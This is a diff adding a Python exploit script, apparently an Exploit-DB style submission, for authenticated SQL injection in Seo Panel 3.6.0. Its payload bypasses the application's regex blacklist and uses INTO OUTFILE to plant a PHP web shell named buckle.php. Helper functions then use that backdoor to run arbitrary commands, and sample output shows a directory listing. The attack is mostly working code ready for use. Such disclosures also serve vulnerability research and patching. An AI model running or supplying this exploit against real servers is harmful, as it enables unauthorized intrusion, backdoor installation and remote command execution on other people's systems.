@@ -1,0 +1,137 @@
+# Exploit Title: Seo Control Panel 3.6.0 Authenticated Sql Injection
+# Date: 10/10/2014
+# Exploit Author: Tiago Carvalho tcarvalho@dognaedis.com or tiago.alexandre@gmail.com
+# Vendor Homepage: www.seopanel.in
+# Software Link: http://www.seopanel.in/spdownload/
+# Version: Seo Panel Version 3.6.0
+# Tested on: Kali Linux and MAC OS X Mavericks
+# OSVDB ID: Requested
+"""
+This vulnerability affects Seo Control Panel -
+Product: Seo Panel Version 3.6.0
+Tested on PHP 5.4.4-14+deb7u14
+Vendor url :http://www.seopanel.in/
+Their are multiple vulnerabilitis in the project not all of them are
+exploitable
+The Flowing exploit is able to successfull bypass the implemented
+protections based on set of regex with along with a blacklist
+the protections are implemeted in the flowing file:
+
+file : includes/sp-load.php
+lines: 128 to 150
+
+The protection can easly be bypassed with payload used by this exploit
+
+The Vulnerable method exploited is located at:
+file: seo-plugins.php
+method: __getSeoPluginInfo
+lines: 175 to 178
+Due to incorrect use of database client api
+
+$ python seopanel.py e 127.0.0.1 /seopanel/ spadmin spadmin
+[*] Upload was successfull!
+
+$ python seopanel.py c 127.0.0.1 /seopanel/ "ls -la"
+total 12
+drwxrwxrwx 2 root root 4096 Oct 9 18:06 .
+drwxr-xr-x 14 root root 4096 Oct 9 11:31 ..
+- -rw-rw-rw- 1 mysql mysql 42 Oct 9 18:06 buckle.php
+"""
+
+#!/usr/bin/env python
+import sys
+import urllib2
+import urllib
+import cookielib
+"""
+	This vulnerability affects Seo Control Panel - 
+	Product: Seo Panel Version 3.6.0 
+	Tested on PHP 5.4.4-14+deb7u14
+	Vendor url :http://www.seopanel.in/
+	Their are multiple vulnerabilitis in the project not all of them are exploitable
+	The Flowing exploit is able to successfull bypass the implemented protections based on set of regex with along with a blacklist
+	the protections are implemeted in the flowing file:
+	
+	file : includes/sp-load.php 
+	lines: 128 to 150
+	
+	The protection can easly be bypassed with payload used by this exploit
+
+	The Vulnerable method exploited is located at: 
+	file: seo-plugins.php 
+	method: __getSeoPluginInfo
+	lines: 175 to 178
+	Due to incorrect use of database client api 
+
+	$ python seopanel.py e 127.0.0.1 /seopanel/ spadmin spadmin
+	[*] Upload was successfull!
+	
+	$ python seopanel.py c 127.0.0.1 /seopanel/ "ls -la"
+	total 12
+	drwxrwxrwx  2 root  root  4096 Oct  9 18:06 .
+	drwxr-xr-x 14 root  root  4096 Oct  9 11:31 ..
+	-rw-rw-rw-  1 mysql mysql   42 Oct  9 18:06 buckle.php
+
+"""
+def exploit(host,path,username,password):
+    #POST Login content type
+    headers = {'Content-type': 'application/x-www-form-urlencoded'}
+
+    #payload creates a file in project_dir/tmp
+    payload = {'pid':'\' UNION/**/select/**/\'\',\'\',\'\',\'\',\'\',\'\',\'\',\'\',"\<\?php system($_REQUEST[\'cmd\']);\?\>"/**/from/**/seoplugins/**/into/**/outfile/**/\'/var/www/seopanel/tmp/buckle.php'}
+
+    base_url = "http://"+host+path
+	
+	#url
+    post_args = {'userName': username, 'password': password,'sec':'login','referer':base_url,'login':'Sign In >>'}
+
+    #login url
+    url_login = base_url+"/login.php"
+
+    #vulnerable url
+    url_plugins = base_url+"/seo-plugins.php"
+
+    cj = cookielib.CookieJar()
+    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+    request = urllib2.Request(url_login)
+    request.add_data(urllib.urlencode(post_args))
+    request.add_header('Content-type', 'application/x-www-form-urlencoded')
+    login_request = opener.open(request)
+
+    code = int(login_request.code)
+    if code == 200:
+    	try:
+    		##The server returns a http status 500 but even when the attack is successfull
+    		opener.open(url_plugins,urllib.urlencode(payload))
+    	except Exception, e:
+    		if check(base_url) == True:
+    			print "[*] Upload was successfull!"
+
+#call uploaded backdore and execute requested command
+def shell(url,command):
+	url_shell = url+'/tmp/buckle.php'
+	encoded_args = urllib.urlencode({'cmd':command})
+	return urllib2.urlopen(url_shell, encoded_args)
+	
+
+#call uploaded backdore execute requested command and print the result
+def cmd(host,path,command):
+	url = "http://"+host+path
+	print shell(url,command).read()
+
+#check uploaded backdore is in place 
+def check(url):
+	code = shell(url,"ls").code
+	if(code == 200):
+		return True
+	else:
+		return False
+
+if len(sys.argv) == 6:
+	if str(sys.argv[1]) == "e":
+		exploit(str(sys.argv[2]),str(sys.argv[3]),str(sys.argv[4]),str(sys.argv[5]))
+
+if len(sys.argv) == 5:
+	if str(sys.argv[1]) == "c":
+		cmd(str(sys.argv[2]),str(sys.argv[3]),str(sys.argv[4]))
+
